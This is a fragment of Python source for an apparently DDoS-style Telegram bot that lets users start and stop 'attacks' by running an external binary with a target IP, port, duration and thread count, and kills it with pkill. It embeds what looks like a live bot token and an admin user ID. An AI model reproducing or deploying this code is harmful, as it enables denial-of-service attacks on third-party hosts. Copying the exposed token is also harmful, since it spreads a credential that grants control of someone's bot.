...
bot_token = '8184252635:AAEDizfdtrZeDrske6WIXoBa74krKrLnC2Y'  # Replace with your bot token
...
ADMIN_ID = 1737555753  # Replace with the actual admin's user ID
...
def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./manav {target} {port} {attack_time} 70"
...
def handle_stop(message):
    subprocess.run("pkill -f manav", shell=True)
    bot.reply_to(message, "🛑 Attack stopped.")

def handle_contact_admin(message):
    bot.reply_to(message, f"📞 @manav909090: {ADMIN_ID}")
